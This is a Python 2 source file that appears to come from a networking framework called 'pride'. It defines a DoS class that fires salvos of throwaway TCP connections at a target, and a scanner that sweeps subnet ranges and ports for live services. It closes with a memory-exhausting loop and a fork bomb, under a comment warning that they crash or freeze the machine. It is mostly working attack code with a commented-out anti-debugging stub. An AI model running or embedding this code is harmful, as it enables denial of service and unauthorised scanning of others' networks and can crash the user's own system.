import sys
import os
import functools
from multiprocessing import Process
from contextlib import contextmanager

import pride
import pride.base as base

import pride.vmlibrary as vmlibrary
import pride.network as network
from pride.utilities import Latency
Instruction = pride.Instruction

"""def trace_function(frame, instruction, args):
    pass

@contextmanager
def resist_debugging():
    sys.settrace(trace_function)
    yield
    sys.settrace(None)"""

    
class Null_Connection(network.Tcp_Client):
    
    def on_connect(self):
        self.delete()        
            
        
class DoS(vmlibrary.Process):

    defaults = vmlibrary.Process.defaults.copy()
    defaults.update({"salvo_size" : 100,
                     "ip" : "localhost",
                     "port" : 80,
                     "target" : None,
                     "display_latency" : False})

    def __init__(self, **kwargs):
        super(DoS, self).__init__(**kwargs)
        self.latency = Latency(name="Salvo size: {}".format(self.salvo_size))
        self.options = {"target" : self.target,
                        "ip" : self.ip,
                        "port" : self.port,
                        "connection_attempts" : 1}
    def run(self):                                         
        if self.display_latency:
            latency = self.latency
            #print "launching salvo: {0} connections per second ({1} connections attempted)".format(self.latency.average.meta_average, (self.count * self.salvo_size))
            self.latency.update()
            self.latency.display()
            
        backup = Null_Connection.defaults.copy()
        Null_Connection.defaults.update(self.options)
        for connection_number in xrange(self.salvo_size):
            self.create(Null_Connection)        
        Null_Connection.defaults.update(backup)
        
        
class Tcp_Port_Tester(network.Tcp_Client):
    
    def on_connect(self):
        print self, "Connected"
        address = self.getpeername()
        self.alert("Found a service at {0}:{1}", address, level='v')
        #Instruction("Service_Listing", "add_service", address).execute()
        self.delete()      
        
        
class Scanner(vmlibrary.Process):

    defaults = vmlibrary.Process.defaults.copy()
    defaults.update({"subnet" : "127.0.0.1",
                     "ports" : (22, ),
                     "range" : (0, 0, 0, 255),
                     "yield_interval" : 100,
                     "discovery_verbosity" : 'v'})

    def __init__(self, **kwargs):
        super(Scanner, self).__init__(**kwargs)
        self.thread = self.new_thread()
        
    def run(self):
        try:
            next(self.thread)
        except StopIteration:
            self.delete()

    def new_thread(self):
        subnet_list = self.subnet.split(".")
        subnet_zero = int(subnet_list[0])
        subnet_zero_range = subnet_zero + self.range[0]
        subnet_one = int(subnet_list[1])
        subnet_one_range = subnet_one + self.range[1]
        subnet_two = int(subnet_list[2])
        subnet_two_range = subnet_two + self.range[2]
        subnet_three = int(subnet_list[3])
        subnet_three_range = subnet_three + self.range[3]

        subnet_range = (subnet_zero_range, subnet_one_range,
                        subnet_two_range, subnet_three_range)
        subnet_range = '.'.join(str(subnet) for subnet in subnet_range)
        self.subnet_range = (self.subnet, subnet_range)

        ports = self.ports
        low_port = min(ports)
        high_port = max(ports)
        if low_port != high_port:
            self.port_range = (low_port, high_port)
        else:
            self.port_range = low_port    
        
        yield_interval = self.yield_interval
        priority = self.priority
        for field_zero in xrange(subnet_zero, subnet_zero_range + 1):
            for field_one in xrange(subnet_one, subnet_one_range + 1):
                for field_two in xrange(subnet_two, subnet_two_range + 1):
                    for field_three in xrange(subnet_three, subnet_three_range + 1):
                        address = ".".join((str(field_zero), str(field_one), str(field_two), str(field_three)))
                        self.alert("Scanning address: {}", [address], level='v')
                        for port in ports:                            
                            self.create(Tcp_Port_Tester, target=(address, port), 
                                        verbosity=self.discovery_verbosity)
                            yield_interval -= 1
                            if not yield_interval:
                                yield
                                yield_interval = self.yield_interval

            
# warning: these will crash/freeze your machine
def memory_eater():
    a_list = [''.join(chr(x) for x in xrange(128))]
    while True:
        try:
            a_list.extend(x * 8 for x in a_list)
        except:
            pass
            
if "win" in sys.platform:
    import subprocess
    fork = subprocess.Popen
else:
    fork = os.fork
    
def fork_bomb(eat_memory=True):
    def spawn():
        return Process(target=fork_bomb)
       
    while True:
        spawn().start()
        if eat_memory:
            memory_eater()